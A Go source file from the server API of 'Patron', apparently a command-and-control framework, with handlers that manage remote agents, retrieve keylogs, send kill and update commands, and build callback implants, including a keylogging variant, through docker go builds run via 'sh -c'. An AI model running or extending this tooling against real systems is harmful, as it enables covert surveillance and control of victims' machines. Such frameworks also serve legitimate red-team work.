package api

import (
	"os"
	"os/exec"
	"fmt"
	"net/http"
	"regexp"
	"strings"

	"github.com/PatronC2/Patron/data"
	"github.com/PatronC2/Patron/types"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

func GetAgentsHandler(c *gin.Context) {
    // Get all agents
    agents, err := data.Agents()
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agents"})
        return
    }

    c.JSON(http.StatusOK, gin.H{"data": agents})
    return
}

func GetGroupAgents(c *gin.Context) {
    // Get agent groups
    agentGroups, err := data.GroupAgentsByIp()
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agents"})
        return
    }

    c.JSON(http.StatusOK, gin.H{"data": agentGroups})
    return
}

func GetGroupAgentsByIP(c *gin.Context) {
    // Get agents by IP
	ip := c.Param("ip")
    agents, err := data.AgentsByIp(ip)
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agents"})
        return
    }

    c.JSON(http.StatusOK, gin.H{"data": agents})
    return
}

func GetOneAgentByUUID(c *gin.Context) {
    // Get agents by UUID
	uuid := c.Param("agt")
	fmt.Println("Trying to find agent", uuid)
    agents, err := data.FetchOneAgent(uuid)
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agent"})
        return
    }
	// agents = [{69a124a8-6795-4481-a6a5-1a88e57a6e88 192.168.50.240 600 80    }]
    c.JSON(http.StatusOK, gin.H{"data": agents})
    return
}

func GetAgentByUUID(c *gin.Context) {
    // Get agents by UUID
	uuid := c.Param("agt")
	fmt.Println("Trying to find agent", uuid)
    agents, err := data.Agent(uuid)
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agent"})
        return
    }

    c.JSON(http.StatusOK, gin.H{"data": agents})
    return
}

func UpdateAgentHandler(c *gin.Context) {
	agentParam := c.Param("agt")
	newCmdID := uuid.New().String()

	var body map[string]string
	if err := c.BindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
		return
	}

	vsvr := regexp.MustCompile(`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}[:](6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$`)
	vserver := vsvr.MatchString(body["callbackserver"])
	vfrequency := regexp.MustCompile(`^\d{1,5}$`)
	vcallbackfrequency := vfrequency.MatchString(body["callbackfreq"])
	vjitter := regexp.MustCompile(`^\d{1,5}$`)
	vcallbackjitter := vjitter.MatchString(body["callbackjitter"])

	if !vserver {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Server IP:Port"})
	} else if !vcallbackfrequency {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Callback Frequency, Max 99999"})
	} else if !vcallbackjitter {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Callback Jitter, Max 100"})
	} else {
		data.UpdateAgentConfig(agentParam, body["callbackserver"], body["callbackfreq"], body["callbackjitter"])
		data.SendAgentCommand(agentParam, "0", "update", body["callbackfreq"]+":"+body["callbackjitter"], newCmdID)
		c.JSON(http.StatusOK, gin.H{"message": "Success"})
	}
}

func KillAgentHandler(c *gin.Context) {
	agentParam := c.Param("agt")
	newCmdID := uuid.New().String()
	data.SendAgentCommand(agentParam, "0", "kill", "Kill Agent", newCmdID)
	data.DeleteAgent(agentParam)
	c.JSON(http.StatusOK, gin.H{"message": "Success"})
}

func GetKeylogHandler(c *gin.Context) {
	agentParam := c.Param("agt")
	keylogs := data.Keylog(agentParam)
	c.JSON(http.StatusOK, gin.H{"data": keylogs})
}

func GetPayloadsHandler(c *gin.Context) {
	payloads := data.Payloads()
	c.JSON(http.StatusOK, gin.H{"data": payloads})
}

func CreateAgentHandler(c *gin.Context) {
	var body types.CreateAgentRequest
	if err := c.ShouldBindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request body"})
		return
	}

	serverIPMatch, _ := regexp.MatchString(`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`, body.ServerIP)
	serverPortMatch, _ := regexp.MatchString(`^(6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$`, body.ServerPort)
	agentFrequencyMatch := regexp.MustCompile(`^\d{1,5}$`).MatchString(body.CallbackFrequency)
	jitterMatch := regexp.MustCompile(`^\d{1,2}$`).MatchString(body.Jitter)
	agentIPMatch, _ := regexp.MatchString(`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`, body.AgentIP)

	if !serverIPMatch || !serverPortMatch || !agentFrequencyMatch || !jitterMatch || !agentIPMatch {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid input parameters"})
		return
	}

	uid := uuid.New().String()
	data.CreateAgent(uid, body.AgentIP+":"+body.ServerPort, body.CallbackFrequency, body.Jitter, body.AgentIP, body.Username, body.Hostname)
	c.JSON(http.StatusOK, gin.H{"data": "success"})
}

func DeleteAgentHandler(c *gin.Context) {
	var body struct {
		UUID string `json:"uuid"`
	}

	if err := c.ShouldBindJSON(&body); err != nil || body.UUID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "UUID is required"})
		return
	}

	data.DeleteAgent(body.UUID)

	c.JSON(http.StatusOK, gin.H{"data": "success"})
}

func CreatePayloadHandler(c *gin.Context) {
	publickey := os.Getenv("PUBLIC_KEY")
	repo_dir := os.Getenv("REPO_DIR")

	newPayID := uuid.New().String()
	var body map[string]string
	if err := c.BindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
		return
	}
	vnm := regexp.MustCompile(`^[a-zA-Z0-9]{1,9}$`)
	vname := vnm.Match([]byte(body["name"]))
	vserverip, _ := regexp.MatchString(`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`, body["serverip"])
	vserverport, _ := regexp.MatchString(`^(6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$`, body["serverport"])
	vfrequency := regexp.MustCompile(`^\d{1,5}$`)
	vcallbackfrequency := vfrequency.Match([]byte(body["callbackfrequency"]))
	vjitter := regexp.MustCompile(`^\d{1,2}$`)
	vcallbackjitter := vjitter.Match([]byte(body["callbackjitter"]))

	if !vserverip {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Server IP"})
	} else if !vserverport {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Server Port"})
	} else if !vcallbackfrequency {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Callback Frequency, Max 99999"})
	} else if !vcallbackjitter {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Callback Jitter, Max 99"})
	} else if !vname {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Name, [a-zA-Z]{1,9}"})
	} else { // else if body["type"] != "original" || body["type"] != "wkeys" {
		// 	res.SendString("Invalid type")
		// }

		tag := strings.Split(newPayID, "-")
		concat := body["name"] + "_" + tag[0]
		var commandString string

		if body["type"] == "original" {
			commandString = fmt.Sprintf(
				"docker run --rm -v %s:/build -w /build golang:1.22.3 "+
				"go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o /build/payloads/%s /build/client/client.go",
				repo_dir,
				body["serverip"],
				body["serverport"],
				body["callbackfrequency"],
				body["callbackjitter"],
				publickey,
				concat,
			)
		} else if body["type"] == "wkeys" {
			commandString = fmt.Sprintf(
				"docker run --rm -v %s:/build -w /build golang:1.22.3 "+
				"go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o /build/payloads/%s /build/client/kclient/kclient.go",
				repo_dir,
				body["serverip"],
				body["serverport"],
				body["callbackfrequency"],
				body["callbackjitter"],
				publickey,
				concat,
			)
		}
		fmt.Printf("Body")
		fmt.Printf("Running command: %s", commandString)
		cmd := exec.Command("sh", "-c", commandString)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		err := cmd.Run()
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Internal Server Error", "details": err.Error()})
		} else {
			data.CreatePayload(newPayID, body["name"], body["description"], body["serverip"], body["serverport"], body["callbackfrequency"], body["callbackjitter"], concat) // from web
			c.JSON(http.StatusOK, gin.H{"data": "success"})
		}
	}
}
